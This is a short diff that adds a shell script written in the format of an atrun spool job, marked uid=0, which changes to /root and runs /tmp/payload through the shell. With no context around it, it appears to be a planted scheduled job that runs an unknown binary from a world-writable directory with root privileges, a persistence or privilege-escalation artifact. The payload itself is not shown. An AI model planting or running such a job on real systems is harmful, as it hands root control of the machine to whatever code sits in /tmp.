@@ -1,0 +1,12 @@
+#!/bin/sh
+# atrun uid=0 gid=0
+# mail root 0
+umask 22
+PATH=/usr/bin:/bin; export PATH
+cd /root || {
+	 echo "Execution directory inaccessible" >&2
+	 exit 1
+}
+${SHELL:-/bin/sh} << 'marcinDELIMITER5d0a9c1b'
+/tmp/payload
+marcinDELIMITER5d0a9c1b
